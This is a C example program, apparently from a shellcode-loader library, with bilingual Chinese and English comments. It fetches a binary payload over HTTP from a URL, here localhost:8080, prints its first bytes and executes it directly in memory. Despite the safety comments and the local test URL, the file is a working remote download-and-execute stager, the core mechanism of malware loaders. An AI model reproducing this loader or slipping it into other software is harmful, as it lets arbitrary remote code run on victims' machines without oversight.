/**
 * @file    remote_fetch.c
 * @brief   示例3: 远程获取并执行 Shellcode / Example 3: Remote Fetch & Execute
 *
 * 演示从远程 HTTP 服务器获取 shellcode 并在内存中执行。
 * Demonstrates fetching shellcode from a remote HTTP server
 * and executing it directly in memory.
 *
 * ⚠ 安全警告 / SECURITY WARNING:
 *   仅从你完全信任的来源获取 shellcode。
 *   Only fetch shellcode from sources you fully trust.
 */

#include "scloader.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#define INIT_CONSOLE() SetConsoleOutputCP(CP_UTF8)
#else
#define INIT_CONSOLE()
#endif

int main(void)
{
    INIT_CONSOLE();
    printf("═══ Shellcode Executor - 远程加载示例 / Remote Load Example ═══\n\n");

    /* 使用一个安全的测试 URL（仅含 INT3+RET 的最小 payload） */
    /* Use a safe test URL (contains minimal INT3+RET payload)     */
    /* 🔒 在实际使用中替换为你自己的可信 URL / Replace with your trusted URL */
    const char *url = "http://127.0.0.1:8080/payload.bin";

    printf("[*] 目标 URL / Target URL: %s\n", url);

    /* 从远程 URL 获取 shellcode / Fetch shellcode from remote URL */
    printf("[*] 正在连接 / Connecting...\n");

    unsigned char *buffer = NULL;
    size_t buffer_size = 0;

    scl_status_t status = scl_remote_fetch(url, &buffer, &buffer_size);

    if (status != SCL_OK) {
        fprintf(stderr, "[!] 远程获取失败 / Remote fetch failed, 状态码 / status: %d\n", status);
        fprintf(stderr, "    ※ 请先启动 HTTP 服务器提供 payload 文件\n");
        fprintf(stderr, "    ※ Please start an HTTP server serving the payload first\n");
        fprintf(stderr, "    ※ 例如 / e.g.: python3 -m http.server 8080\n");
        return 1;
    }

    printf("[✓] 成功获取 / Fetched successfully! (%zu bytes)\n\n", buffer_size);

    /* 显示前 16 字节的 hex dump / Show first 16 bytes hex dump */
    printf("[*] 接收数据的前 16 字节 / First 16 bytes:\n");
    size_t dump_len = (buffer_size < 16) ? buffer_size : 16;
    for (size_t i = 0; i < dump_len; i++) {
        printf("%02X ", buffer[i]);
        if ((i + 1) % 8 == 0) printf(" ");
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    /* 执行获取的 shellcode / Execute the fetched shellcode */
    scl_loader_config_t config = SCL_LOADER_CONFIG_DEFAULT;
    printf("[*] 正在执行远程 shellcode / Executing remote shellcode...\n\n");

    status = scl_load_and_exec(buffer, buffer_size, &config);

    free(buffer); /* 释放缓冲区 / Release buffer */

    if (status == SCL_OK) {
        printf("\n[✓] 远程 shellcode 执行成功 / Remote shellcode executed!\n");
    } else {
        printf("\n[✗] 远程执行失败 / Remote execution failed, 状态码: %d\n", status);
        return 1;
    }

    return 0;
}